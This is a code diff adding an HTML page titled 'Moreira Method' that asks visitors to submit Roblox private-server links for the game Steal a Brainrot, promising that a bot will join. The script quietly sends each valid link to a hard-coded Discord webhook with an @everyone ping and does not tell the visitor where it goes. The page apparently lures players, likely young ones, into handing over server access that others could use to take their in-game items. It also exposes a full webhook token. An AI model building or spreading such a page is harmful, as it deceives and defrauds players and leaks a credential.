@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Moreira Method</title>
+
+  <style>
+    body {
+      background-color: #0b0b0b;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      justify-content: center;
+    }
+
+    .box {
+      width: 600px;
+      padding: 30px;
+      background: linear-gradient(145deg, #1a1a1a, #111);
+      border-radius: 15px;
+      box-shadow: 0 0 20px #00ff99;
+      text-align: center;
+    }
+
+    h2 {
+      color: #00ff99;
+      font-size: 28px;
+    }
+
+    .info-text {
+      color: #00ccff;
+      font-style: italic;
+      margin-bottom: 10px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      background: #111;
+      color: #fff;
+      border: 1px solid #555;
+      border-radius: 6px;
+      margin-top: 8px;
+      font-size: 16px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      background: #00ff99;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #00cc7a;
+    }
+
+    .success {
+      color: #00ff99;
+      margin-top: 20px;
+      display: none;
+    }
+
+    .error {
+      color: #ff4444;
+      margin-top: 20px;
+      display: none;
+    }
+
+    .bottom-image {
+      margin-top: 30px;
+      width: 100%;
+      max-width: 600px;
+      border-radius: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="box">
+    <h2>Moreira Method</h2>
+    <p>Enter your Private Server link, join and wait a bot join</p>
+    <p class="info-text">Only official Steal a Brainrot links are allowed</p>
+
+    <input id="psLink" placeholder="https://www.roblox.com/share?1234567890&type=Server...">
+
+    <button onclick="send()">Submit</button>
+
+    <div class="success" id="success">
+      ✅ Lien Steal a Brainrot envoyé !
+    </div>
+
+    <div class="error" id="error">
+      ❌ Lien invalide (Steal a Brainrot uniquement)
+    </div>
+  </div>
+
+  <img src="https://i.pinimg.com/1200x/f7/ed/ac/f7edac2a781e4b86541cb03c127f68eb.jpg" class="bottom-image">
+
+  <script>
+    function send() {
+      const link = document.getElementById("psLink").value.trim();
+      const success = document.getElementById("success");
+      const error = document.getElementById("error");
+
+      success.style.display = "none";
+      error.style.display = "none";
+
+      if (!link) {
+        error.style.display = "block";
+        return;
+      }
+
+      // ✅ Vérification Steal a Brainrot OFFICIEL
+      const isValid =
+        link.includes("roblox.com/games") &&
+        link.toLowerCase().includes("steal-a-brainrot");
+
+      if (!isValid) {
+        error.style.display = "block";
+        return;
+      }
+
+      fetch("https://discord.com/api/webhooks/1452873894682824777/6zrnDuILFSv3skLD4gff5B5ZC4uDo_no_jMo86jaRocJampAzjZPBO2l6gRqHlZS_hHh", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: "@everyone 🧠 # Nouveau lien Steal a Brainrot",
+          embeds: [
+            {
+              description: "🔗 " + link,
+              image: {
+                url: "https://i.pinimg.com/1200x/f7/ed/ac/f7edac2a781e4b86541cb03c127f68eb.jpg"
+              },
+              color: 65280
+            }
+          ]
+        })
+      });
+
+      success.style.display = "block";
+    }
+  </script>
+
+</body>
+</html>
